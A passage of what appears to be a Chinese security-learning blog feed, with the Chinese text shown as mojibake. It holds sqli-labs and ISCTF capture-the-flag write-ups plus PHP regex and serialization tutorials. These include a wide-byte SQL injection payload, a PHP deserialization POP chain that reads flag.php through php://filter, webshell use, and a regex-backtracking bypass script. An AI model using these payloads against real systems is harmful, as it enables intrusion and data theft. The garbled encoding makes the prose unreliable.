ä¸Š\å¯¼è‡´è½¬æ„ã€‚è¿™æ—¶å€™æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨å®½å­—èŠ‚ç»•è¿‡<br>ç”±äº<code>\</code>çš„urlç¼–ç ä¸º%5cï¼Œè¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥åœ¨%5cå‰åŠ ä¸€ä¸ª%dfè¿™æ—¶å€™å°±ä¼šç»„æˆä¸º%df%5cè€Œè¿™ä¸¤ä¸ªå­—èŠ‚å°±è¡¨ç¤ºä¸€ä¸ªæ±‰å­—ï¼Œè¿™æ—¶å€™è¿™ä¸ªæ±‰å­—å°±æŠŠ\ç»™åƒäº†è¿™æ—¶å€™æˆ‘ä»¬çš„â€™å°±ä¸ä¼šè¢«è½¬æ„ã€‚å°±å¯ä»¥æˆåŠŸç»•è¿‡<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%df&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x7573657273</span><br></pre></td></tr></table></figure><br><strong>æ³¨æ„ï¼šå› ä¸ºåœ¨åé¢çš„æŸ¥è¯¢è¯­å¥ä¸­å°†\â€™çš„<code>\</code>ç»™è½¬æ¢æˆæ±‰å­—ä¼šå¯¼è‡´è¯­å¥æŠ¥é”™æ‰€ä»¥æˆ‘ä»¬ï¼Œè¦å°†æœ€åwhere table_name=çš„è¡¨åè½¬æ¢æˆ16è¿›åˆ¶è¿™æ ·å¯ä»¥ä¸ç”¨ä½¿ç”¨â€™</strong></p><h1 id="less33"><a href="#less33" class="headerlink" title="less33"></a>less33</h1><p>è¿™å…³ä¸ä¸Šä¸€ä¸ªå‡ ä¹ç›¸åŒï¼Œåªæ˜¯è¿‡æ»¤çš„å‡½æ•°ä¸º<code>addslashes()</code>è¿™ä¸€ä¸ªå‡½æ•°æ˜¯å°†å­—ç¬¦ä¸²ä¸­çš„ä½¿ç”¨ç‰¹æ®Šå­—ç¬¦è½¬æ„ã€‚å…¶ç»•è¿‡æ–¹æ³•ä¸32ç›¸åŒéƒ½æ˜¯åˆ©ç”¨gbkçš„å®½å­—èŠ‚ç»•è¿‡</p><h1 id="less34"><a href="#less34" class="headerlink" title="less34"></a>less34</h1><p>è¿™å…³æˆ‘ä»¬ç›´æ¥æŠ“åŒ…ï¼Œå› ä¸ºåœ¨ä½¿ç”¨ä½¿ç”¨hackbarçš„æ—¶å€™å‡ºç°äº†ä¸€ä¸ªé—®é¢˜å¦‚å›¾<br><img src="/2023/12/12/sqli-labs-less32-37%E5%AE%BD%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87/34-1.png" class="" title="Alt text"><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æ˜¾ç¤ºäº†<code>URL malformedï¼ˆurlç•¸å½¢ï¼‰</code>æ˜¾ç¤ºè¿™ä¸ªçš„åŸå› æ˜¯%è¢«urlencodeæˆäº†%25è¿™ä¹Ÿå°±å¯¼è‡´è¿™ä¸ªæŠ¥é”™ã€‚<br>æˆ‘ä»¬ç›´æ¥æŠ“åŒ…æŸ¥çœ‹æœç„¶æˆ‘ä»¬çœ‹åˆ°äº†åœ¨%dfå˜æˆäº†%25dfå¤šäº†ä¸ª25è¿™ä¸ªæ˜¯%è¢«urlç¼–ç å¯¼è‡´çš„ï¼ŒæŠŠ25åˆ äº†ä¹‹åå°±æ˜¯æ­£å¸¸çš„è§£é¢˜æ­¥éª¤äº†<br><img src="/2023/12/12/sqli-labs-less32-37%E5%AE%BD%E5%AD%97%E7%AC%A6%E7%BB%95%E8%BF%87/34-2.png" class="" title="Alt text"></p><h1 id="less-35"><a href="#less-35" class="headerlink" title="less 35"></a>less 35</h1><p>è¿™ä¸€å…³æˆ‘ä»¬åœ¨æ³¨å…¥?id=%dfâ€™çš„æ—¶å€™å‘ç°â€™è¢«è½¬æ„æ²¡æœ‰ç°è±¡ä¸å‰å‡ å…³éƒ½ä¸åŒï¼Œæˆ‘ä»¬æŸ¥çœ‹æºç å‘ç°ï¼Œä»–æ˜¯æ•°å­—å‹æ³¨å…¥ã€‚ã€‚ã€‚ã€‚è¿™å‘Šè¯‰æˆ‘ä»¬ä¸è¦å­—ç¬¦å‹çš„åšå‚»äº†å§å»è€ƒè™‘æ•°å­—å‹æ³¨å…¥,æ—¢ç„¶æ˜¯æ•°å­—å‹é‚£ä¹ˆå°±ä¸éœ€è¦é—­åˆäº†ç›´æ¥unionæ³¨å…¥</p><h1 id="less-36"><a href="#less-36" class="headerlink" title="less 36"></a>less 36</h1><p>è¯¥é¢˜ç›®ä¸32å…³å‡ ä¹æ²¡æœ‰åŒºåˆ«åªæ˜¯ï¼Œå…¶è¿‡æ»¤çš„è¯­å¥ä¸ºmysql_real_escape_string()è¿™ä¸ªå‡½æ•°æ˜¯sqlçš„è¯­å¥æ˜¯å°†å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦è½¬ä¹‰</p><h1 id="less-37"><a href="#less-37" class="headerlink" title="less 37"></a>less 37</h1><p>å’Œ37ä¸€æ¨¡ä¸€æ ·åªæ˜¯è¿‡æ»¤æ–¹æ³•æ”¹æˆäº†mysql_real_escape_string()</p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
          <category> é¶åœº </category>
          
          <category> sql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> top10 </tag>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ­£åˆ™è¡¨è¾¾å¼</title>
      <link href="/2023/12/11/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
      <url>/2023/12/11/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<p>è¿™ä¸ªå‡½æ•°æ˜¯ä¸ªæ­£åˆ™è¡¨è¾¾å¼ï¼Œä»£ç å¦‚ä¸‹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php/i&quot;</span>, <span class="string">&quot;PHP is the web scripting language of choice.&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;æŸ¥æ‰¾åˆ°åŒ¹é…çš„å­—ç¬¦ä¸² phpã€‚&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;æœªå‘ç°åŒ¹é…çš„å­—ç¬¦ä¸² phpã€‚&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>è¾“å‡ºï¼šæŸ¥æ‰¾åˆ°åŒ¹é…çš„å­—ç¬¦ä¸² php<br>ä¸Šé¢çš„ä»£ç çš„æ„æ€ä¸ºï¼šåœ¨åå¼çš„â€PHPâ€ä¸­æŸ¥æ‰¾å‰å¼åˆ—å‡ºçš„å­—ç¬¦ä¸²php,æœ‰åˆ™è¿”å›1æ— è¿”å›0<br>/php/ä¸¤è¾¹çš„/æ˜¯ç”¨äºå¯¹å­—ç¬¦ä¸²çš„åˆ†éš”//åçš„iä»£è¡¨è¿™æ˜¯ä¸€ä¸ªå¯¹å¤§å°å†™ä¸æ•æ„Ÿçš„æŸ¥è¯¢æ‰€æœ‰è¿™ä¸ªä¼šè¿”å›1å°±æ˜¯çœŸ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/* æ¨¡å¼ä¸­çš„ \b æ ‡è®°ä¸€ä¸ªå•è¯è¾¹ç•Œï¼Œæ‰€ä»¥åªæœ‰ç‹¬ç«‹çš„å•è¯&quot;web&quot;ä¼šè¢«åŒ¹é…ï¼Œè€Œä¸ä¼šåŒ¹é…</span><br><span class="line"> * å•è¯çš„éƒ¨åˆ†å†…å®¹æ¯”å¦‚&quot;webbing&quot; æˆ– &quot;cobweb&quot; */</span><br><span class="line">if (preg_match(&quot;/\bweb\b/i&quot;, &quot;PHP is the web scripting language of choice.&quot;)) &#123;</span><br><span class="line">    echo &quot;æŸ¥æ‰¾åˆ°åŒ¹é…çš„å­—ç¬¦ä¸²ã€‚\n&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;æœªå‘ç°åŒ¹é…çš„å­—ç¬¦ä¸²ã€‚\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">if (preg_match(&quot;/\bweb\b/i&quot;, &quot;PHP is the website scripting language of choice.&quot;)) &#123;</span><br><span class="line">    echo &quot;æŸ¥æ‰¾åˆ°åŒ¹é…çš„å­—ç¬¦ä¸²ã€‚\n&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;æœªå‘ç°åŒ¹é…çš„å­—ç¬¦ä¸²ã€‚\n&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>è¾“å‡º<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">æŸ¥æ‰¾åˆ°åŒ¹é…çš„å­—ç¬¦ä¸²ã€‚</span><br><span class="line">æœªå‘ç°åŒ¹é…çš„å­—ç¬¦ä¸²ã€‚</span><br></pre></td></tr></table></figure><br>åœ¨å‰å¼çš„å­—ç¬¦ä¸²ç”¨/åˆ†éš”å­—ç¬¦ä¸²æ—¶å¯ä»¥æ·»åŠ \bæ¥æ ‡è®°å•è¯è¾¹ç•Œï¼Œåªæœ‰ç‹¬ç«‹çš„å•è¯ä¼šè¢«æŸ¥è¯¢åŒ¹é…</p><h1 id="æ­£åˆ™è¡¨è¾¾å¼çš„å‡ ç§ä¿®é¥°ç¬¦"><a href="#æ­£åˆ™è¡¨è¾¾å¼çš„å‡ ç§ä¿®é¥°ç¬¦" class="headerlink" title="æ­£åˆ™è¡¨è¾¾å¼çš„å‡ ç§ä¿®é¥°ç¬¦"></a>æ­£åˆ™è¡¨è¾¾å¼çš„å‡ ç§ä¿®é¥°ç¬¦</h1><p>i:å¿½ç•¥å¤§å°å†™çš„åŒ¹é…<br>s:å¯ä»¥åŒ¹é…ä»»æ„å­—ç¬¦åŒ…æ‹¬æ¢è¡Œç¬¦<br>m:å¯ä»¥é‡‡ç”¨å¤šè¡Œè¯†åˆ«,é‡åˆ°æ¢è¡Œä¹Ÿæ‰¿è®¤åŒ¹é…è§„åˆ™<br>x:å¿½ç•¥æ‰è§„åˆ™æ¨¡å¼ä¸­çš„ç©ºç™½å­—ç¬¦<br>a:å¼ºåˆ¶ä»å¤´å¼€å§‹åŒ¹é…<br>u:ç¦æ­¢è´ªå©ªåŒ¹é…ï¼Œåªè·Ÿè¸ªåˆ°æœ€è¿‘çš„ä¸€ä¸ªåŒ¹é…ç¬¦å¹¶ç»“æŸ</p>]]></content>
      
      
      
        <tags>
            
            <tag> phpå‡½æ•° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ISCTFçš„wp</title>
      <link href="/2023/11/28/ISCTF%E7%9A%84wp/"/>
      <url>/2023/11/28/ISCTF%E7%9A%84wp/</url>
      
        <content type="html"><![CDATA[<h1 id="è¿˜æ˜¯tclå¹¶æ²¡æœ‰å†™å‡ºæ¥å‡ é¢˜ä½†æ˜¯æœ‰å­¦åˆ°ä¸å°‘ã€‚"><a href="#è¿˜æ˜¯tclå¹¶æ²¡æœ‰å†™å‡ºæ¥å‡ é¢˜ä½†æ˜¯æœ‰å­¦åˆ°ä¸å°‘ã€‚" class="headerlink" title="è¿˜æ˜¯tclå¹¶æ²¡æœ‰å†™å‡ºæ¥å‡ é¢˜ä½†æ˜¯æœ‰å­¦åˆ°ä¸å°‘ã€‚"></a>è¿˜æ˜¯tclå¹¶æ²¡æœ‰å†™å‡ºæ¥å‡ é¢˜ä½†æ˜¯æœ‰å­¦åˆ°ä¸å°‘ã€‚</h1><p>1.åœ£æ¯æˆ˜äº‰ï¼ï¼<br>å½“æˆ‘çœ‹åˆ°è¿™é“é¢˜çš„æ—¶å€™æˆ‘é©¬ä¸Šå°±å‘ç°è¿™ä¸ªæ–°ç”Ÿèµ›å’Œæˆ‘ä¹‹å‰åšçš„å®Œå…¨ä¸æ˜¯ä¸€ä¸ªç­‰çº§çš„ï¼Œåˆšå¼€å§‹åšè¿™é¢˜çš„ä½¿ç”¨ç”±äºæœ¬äººä¸ä¼šphpçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ‰€ä»¥è¿™é¢˜æ˜¯æˆ‘å­¦ä¹ äº†å¾ˆä¹…æ‰åšå‡ºè¿™é“é¢˜ç›®ã€‚å­¦ä¹ è¿‡ç¨‹åœ¨è¿™é‡Œ<a href="../../../../2023/11/25/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„å­¦ä¹ </a><br><img src="/2023/11/28/ISCTF%E7%9A%84wp/1-1.png" class="" title="Alt text"><br>è¿™é“é¢˜ç›®çš„æç¤ºåšçš„å¾ˆæ˜æ˜¾ï¼Œå‡ºé¢˜äººå°†æ„é€ popé“¾çš„é¡ºåºéƒ½å’Œæˆ‘ä»¬è¯´äº†ã€‚æˆ‘ä»¬è¦ä»summonåˆ°artifactåˆ°preoareåˆ°saberï¼Œ<br>æˆ‘ä»¬å¯ä»¥å…ˆä¸ª$Saberèµ‹å€¼ä¸ºå¯¹è±¡artifacté‚£ä¹ˆå½“è¾“å‡º$Saberæ—¶ä¼šå› ä¸ºé”™è¯¯çš„å°†å¯¹artifactå½“æˆå­—ç¬¦ä¸²è¾“å‡ºé‚£ä¹ˆå°±ä¼šè§¦å‘artifactçš„<strong>tostring()ï¼Œæˆ‘ä»¬å†å°†å˜é‡$excalibuerèµ‹å€¼ä¸ºå¯¹è±¡prepareé‚£ä¹ˆå°±ä¼šé”™è¯¯çš„è°ƒç”¨æ²¡æœ‰çš„æˆå‘˜å±æ€§ä»è€Œè§¦å‘</strong>get($key)æˆ‘ä»¬å†å°†$releaseèµ‹å€¼ä¸ºsaberé‚£ä¹ˆå°±ä¼šå› ä¸ºé”™è¯¯çš„å°†å¯¹è±¡saberå½“æˆå‡½æ•°è§¦å‘ä»è€Œè§¦å‘__invoke()é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å¯¹æˆåŠŸé“¾æ¥åˆ°æˆ‘ä»¬çš„ç›®æ ‡å‡½æ•°include()äº†ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬åº”è¯¥å¯¹weaponè¿›è¡Œèµ‹å€¼ä»è€Œå¾—åˆ°flag<br>è¿™é“é¢˜ç›®é™¤äº†è€ƒå¯Ÿphpçš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–è¿˜è€ƒæŸ¥çœ‹äº†phpçš„ååºåˆ—åŒ–ä¹Ÿå°±æ˜¯å…³äºæœ€ç»ˆinclude()çš„åˆ©ç”¨æˆ‘ä»¬å¯ä»¥å†includeå‡½æ•°é‡Œè¾“å…¥ä¸€ä¸ªphpä¼ªåè®®ä»è€Œå¾—åˆ°flag<br><a href="">phpä¼ªåè®®</a><br>æˆ‘ä»¬åªè¦å°†weaponèµ‹å€¼ä¸º<code>php://filter/read=convert.base64-encode/resource=flag.php</code><br>æˆ‘ä»¬å°†ä¸Šé¢çš„æ‰€ä»¥æ•´åˆåœ¨ä¸€èµ·æ„é€ popé“¾ä»£ç å¦‚ä¸‹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">artifact</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$excalibuer</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$arrow</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">prepare</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$release</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">saber</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$weapon</span>=<span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">summon</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Saber</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Rider</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">summon</span>();</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> <span class="title function_ invoke__">artifact</span>();</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> <span class="title function_ invoke__">prepare</span>();</span><br><span class="line"><span class="variable">$d</span>=<span class="keyword">new</span> <span class="title function_ invoke__">saber</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;Saber=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;excalibuer=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;release=<span class="variable">$d</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><figure class="highlight php"><figcaption><span>è¾“å‡º</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">6</span>:<span class="string">&quot;summon&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">5</span>:<span class="string">&quot;Saber&quot;</span>;O:<span class="number">8</span>:<span class="string">&quot;artifact&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">10</span>:<span class="string">&quot;excalibuer&quot;</span>;O:<span class="number">7</span>:<span class="string">&quot;prepare&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;release&quot;</span>;O:<span class="number">5</span>:<span class="string">&quot;saber&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">6</span>:<span class="string">&quot;weapon&quot;</span>;s:<span class="number">57</span>:<span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;&#125;&#125;s:<span class="number">5</span>:<span class="string">&quot;arrow&quot;</span>;N;&#125;s:<span class="number">5</span>:<span class="string">&quot;Rider&quot;</span>;N;&#125;</span><br></pre></td></tr></table></figure><br>å°†è¾“å‡ºçš„ç»“æœç”¨GETä¼ å€¼åˆ°payloadé‡Œæˆ‘ä»¬å°±å¯ä»¥å¾—åˆ°base64ç¼–ç åçš„flagå°†å…¶è§£ç åå³å¯<br>2.where_is_the_flag<br>æ‰“å¼€é¢˜ç›®æˆ‘ä»¬å¯ä»¥å‘ç°æ˜¾ç¤ºäº†ä¸€å¥è¯æœ¨é©¬<br><img src="/2023/11/28/ISCTF%E7%9A%84wp/2-1.png" class="" title="Alt text"><br>æˆ‘ä»¬ç›´æ¥ä½¿ç”¨èšå‰‘è¿›è¡Œè¿æ¥<img src="/2023/11/28/ISCTF%E7%9A%84wp/2-2.png" class="" title="Alt text"><br>æˆ‘ä»¬å¯ä»¥å‘ç°ä¸¤ä¸ªæ–‡ä»¶ä¸€ä¸ªæ˜¯flag2å¦ä¸€ä¸ªä¸ºstart.shçš„æ–‡ä»¶æ‰“å¼€start.shæ–‡ä»¶å‘ç°é‡Œé¢å†™ä¸Šäº†phpä»£ç <img src="/2023/11/28/ISCTF%E7%9A%84wp/2-3.png" class="" title="Alt text"><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç¬¬äºŒè¡Œçš„ä»£ç sed -iæ˜¯linuxå¯¹æ–‡ä»¶ä¿®æ”¹çš„æŒ‡ä»¤ï¼Œsæ˜¯å¯¹æ–‡ä»¶å†…å®¹æ›¿æ¢ï¼Œä¸ºè¦æ›¿æ¢çš„å­—ç¬¦ä¸²ï¼Œ${FLAG:0:10}ä¸ºæ›¿æ¢çš„å†…å®¹ä¸ºFLAGä»ç¬¬1ä¸ªå¼€å§‹çš„10ä¸ªå­—ç¬¦ï¼Œè€Œåé¢çš„è·¯å¾„ä¸ºè¦ä¿®æ”¹çš„æ–‡ä»¶ä½ç½®ï¼Œç»“åˆèµ·æ¥å°±æ˜¯å°†FLAGçš„å‰10ä½å†™å…¥flag.phpä¸­æˆ‘ä»¬å¯ä»¥ç›´æ¥ç”¨èšå‰‘æŸ¥çœ‹flag.php,<br>ç¬¬3è¡Œçš„ä»£ç æ˜¯å°†FLAGçš„10åˆ°20ä¸ªå­—ç¬¦ä¼ åˆ°flag2é‡Œ<br>exportå‡½æ•°æ˜¯å°†å˜é‡è¾“å‡ºä¸ºç¯å¢ƒå˜é‡ï¼Œä¹Ÿå°±æ˜¯å°†FLAG 20ä¸ºä»¥åçš„æ•°æ›¿æ¢åˆ°FLAG3é‡Œåå¯¼å…¥åˆ°ç¯å¢ƒå˜é‡ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨èšå‰‘çš„è™šæ‹Ÿç»ˆç«¯é‡Œecho FLAG3å¯¹flag3è¿›è¡Œè¾“å‡ºæœ€åç»„åˆåœ¨ä¸€èµ·å°±æ˜¯flagäº†å•¦<br>3.ç»•è¿›ä½ å¿ƒé‡Œ<br>è¿™é“é¢˜å‰é¢æ˜¯å‡ ä¸ªç®€å•çš„ç»•è¿‡<br><img src="/2023/11/28/ISCTF%E7%9A%84wp/3-1.png" class="" title="Alt text"><br>ç¬¬ä¸€ä¸ªmd5ç»•è¿‡ç”±äºæ˜¯å¼ºæ¯”è¾ƒæ‰€æœ‰æˆ‘ä»¬åªèƒ½ä½¿ç”¨æ•°ç»„ç»•è¿‡ï¼Œç”±äºå½“æˆ‘ä»¬ä¼ å…¥æ•°ç»„é“md5å‡½æ•°é‡Œmd5å‡½æ•°å°±ä¼šè¿”å›nullè¿™æ ·å°±å¯ä»¥ç»•è¿‡<br>ç¬¬äºŒä¸ªåªè¦numä¼ å…¥éæ•°å­—å°±å¯ä»¥äº†<br>è€Œæœ€åä¸€ä¸ªç»•è¿‡ä¸­+ï¼Ÿçš„æ„æ€æ˜¯åŒ¹é…ä»»æ„é™¤å›è½¦ä»¥å¤–çš„å­—ç¬¦ï¼Œiè¡¨ç¤ºè¿™æ˜¯ä¸€ä¸ªå¯¹å¤§å°å†™ä¸æ•æ„Ÿçš„åŒ¹é…ï¼Œså¯ä»¥åŒ¹é…ä»»æ„å­—ç¬¦åŒ…æ‹¬å›è½¦ã€‚<br>è€Œä¸‹è¯­å¥ä¸­striposæ˜¯ä¸€ä¸ªå¤§å°å†™ä¸æ•æ„Ÿçš„åŒ¹é…ï¼Œè§‚å¯Ÿä»£ç æˆ‘ä»¬å‘ç°æˆ‘ä»¬éœ€è¦è¾“å…¥2023ISCTFæœ‰ä¸èƒ½å†ISCTFå‰æ·»åŠ å­—ç¬¦ï¼Œå‘ç°æˆ‘ä»¬æ— æ³•ä»¥å¸¸è§„æ–¹æ³•ç»•è¿‡ï¼Œæ‰€æœ‰æˆ‘ä»¬è¿™ä¸ªç»•è¿‡è¦ç”¨åˆ°æ­£åˆ™å›æº¯<br>æ­£åˆ™è¡¨è¾¾å¼åœ¨è¿›è¡ŒåŒ¹é…æ—¶ä¼šå‘ç”Ÿæ­£åˆ™å›æº¯ï¼Œè€Œæ­£åˆ™åŒ¹é…æœ‰ä¸ªä¸Šé™ï¼Œä¸Šçº¿ä¸ºä¸€ç™¾ä¸‡é‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦åœ¨2023ISCTFå‰è¾“å…¥100ä¸‡ä¸ªå­—ç¬¦é‚£ä¹ˆå°±ä¼šè¶…è¿‡å›æº¯ä¸Šé™ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä»¥ä¸‹pythonä»£ç <br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">res = requests.post(<span class="string">&quot;ç½‘ç«™url&quot;</span>,data = &#123;<span class="string">&quot;str&quot;</span>:<span class="string">&quot;a&quot;</span>*<span class="number">1000000</span>+<span class="string">&quot;2023ISCTF&quot;</span>&#125;)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><br>è¿è¡Œåå°±ä¼šè¾“å‡ºflag</p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
          <category> æ¯”èµ›wp(å¤ç°) </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åºåˆ—åŒ–ä¸ååºåˆ—åŒ–</title>
      <link href="/2023/11/25/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/11/25/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="æˆ‘ä¼šåœ¨è¿™é‡Œå†™ä¸‹æˆ‘å­¦ä¹ åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹"><a href="#æˆ‘ä¼šåœ¨è¿™é‡Œå†™ä¸‹æˆ‘å­¦ä¹ åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹" class="headerlink" title="æˆ‘ä¼šåœ¨è¿™é‡Œå†™ä¸‹æˆ‘å­¦ä¹ åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹"></a>æˆ‘ä¼šåœ¨è¿™é‡Œå†™ä¸‹æˆ‘å­¦ä¹ åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„è¿‡ç¨‹</h1><h1 id="ç±»ä¸å¯¹åƒ"><a href="#ç±»ä¸å¯¹åƒ" class="headerlink" title="ç±»ä¸å¯¹åƒ"></a>ç±»ä¸å¯¹åƒ</h1><p>å­¦ä¹ åºåˆ—åŒ–å’Œååºåˆ—åŒ–æœ€åŸºæœ¬çš„å°±æ˜¯å¯¹ç±»å’Œå¯¹è±¡çš„äº†è§£</p><h2 id="ä»€ä¹ˆæ˜¯ç±»ä»€ä¹ˆæ˜¯å¯¹è±¡"><a href="#ä»€ä¹ˆæ˜¯ç±»ä»€ä¹ˆæ˜¯å¯¹è±¡" class="headerlink" title="ä»€ä¹ˆæ˜¯ç±»ä»€ä¹ˆæ˜¯å¯¹è±¡"></a>ä»€ä¹ˆæ˜¯ç±»ä»€ä¹ˆæ˜¯å¯¹è±¡</h2><p>ç±»å°±æ˜¯å°±æ˜¯å¯¹è±¡çš„æŠ½è±¡ï¼Œè€Œå¯¹è±¡å°±æ˜¯å¯¹ç±»çš„å®ä¾‹åŒ–</p><h3 id="ä¸¾ä¾‹"><a href="#ä¸¾ä¾‹" class="headerlink" title="ä¸¾ä¾‹"></a>ä¸¾ä¾‹</h3><p>ç±»ç›¸å½“äºä¸€ä¸ªå†™ç€ç”µè„‘é…ç½®çš„æ¸…å•è€Œå¯¹è±¡å°±æ˜¯è¿™å¤ªç”µè„‘ç»„è£…åçš„æ ·å­ï¼Œä¹Ÿå°±æ˜¯è¯´å¯¹è±¡æ˜¯ç±»çš„å®ä½“ä¹Ÿå°±æ˜¯å®ä¾‹</p><h1 id="ç±»çš„å®šä¹‰"><a href="#ç±»çš„å®šä¹‰" class="headerlink" title="ç±»çš„å®šä¹‰"></a>ç±»çš„å®šä¹‰</h1><h2 id="ç±»çš„å®šä¹‰åŒ…å«å¯¹ç±»åçš„å®šä¹‰å¯¹æˆå‘˜å˜é‡ï¼ˆå±æ€§ï¼‰çš„å®šä¹‰å¯¹æˆå‘˜å‡½æ•°çš„å®šä¹‰ï¼ˆæ–¹æ³•ï¼‰ä»¥ä¸‹ä¸ºä»£ç æ¼”ç¤º"><a 